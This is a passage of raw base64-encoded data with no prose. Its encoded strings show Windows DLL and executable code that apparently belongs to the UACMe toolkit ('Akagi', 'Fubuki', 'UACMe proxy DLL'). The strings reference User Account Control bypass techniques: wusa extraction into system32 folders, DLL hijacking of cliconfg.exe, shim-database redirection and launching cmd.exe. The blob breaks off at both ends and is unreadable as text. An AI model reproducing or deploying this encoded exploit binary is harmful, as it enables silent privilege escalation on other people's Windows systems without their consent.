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m9hcmQAV2RzQWJvcnRCbGFja2JvYXJkSXRlbUVudW0AV2RzQ3JlYXRlQmxhY2tib2FyZABXZHNEZXN0cm95QmxhY2tib2FyZABXZHNFbnVtRmlyc3RCbGFja2JvYXJkSXRlbQBXZHNFbnVtTmV4dEJsYWNrYm9hcmRJdGVtAFdkc0ZyZWVEYXRhAFdkc0dldEJsYWNrYm9hcmRWYWx1ZQBXZHNJbml0aWFsaXplAFdkc0lzRGlhZ25vc3RpY01vZGVFbmFibGVkAFdkc1NldEFzc2VydEZsYWdzAFdkc1NldHVwTG9nTWVzc2FnZVcAV2RzVGVybWluYXRlAEdDVEwAEAAAiQIAAC50ZXh0JG1uAAAAAAAgAAA8AAAALmlkYXRhJDUAAAAAQCAAABgBAAAucmRhdGEAAGAhAACUAwAALmVkYXRhAAD0JAAA3AAAAC5yZGF0YSR6enpkYmcAAADQJQAAKAAAAC5pZGF0YSQyAAAAAPglAAAUAAAALmlkYXRhJDMAAAAADCYAADwAAAAuaWRhdGEkNAAAAABIJgAA+gAAAC5pZGF0YSQ2AAAAAAAwAACgAAAALnJzcmMkMDEAAAAAoDAAAEAEAAAucnNyYyQwMgAAAAAgJgAAAAAAAAAAAADkJgAAFCAAAAwmAAAAAAAAAAAAADQnAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWJwAABicAAPImAAAmJwAAAAAAAKYmAACyJgAAmCYAANImAACCJgAAZiYAAFomAADAJgAASCYAAAAAAAC+AkdldFN0YXJ0dXBJbmZvVwAzA0hlYXBGcmVlAABVAUV4cGFuZEVudmlyb25tZW50U3RyaW5nc1cA+gNPdXRwdXREZWJ1Z1N0cmluZ1cAAH8AQ2xvc2VIYW5kbGUALwNIZWFwQWxsb2MAUQFFeGl0UHJvY2VzcwCiAkdldFByb2Nlc3NIZWFwAADbAENyZWF0ZVByb2Nlc3NXAABLRVJORUwzMi5kbGwAAJICUmVnUXVlcnlWYWx1ZUV4VwAAhQJSZWdPcGVuS2V5RXhXAGgCUmVnRGVsZXRlS2V5VwBUAlJlZ0Nsb3NlS2V5AEFEVkFQSTMyLmRsbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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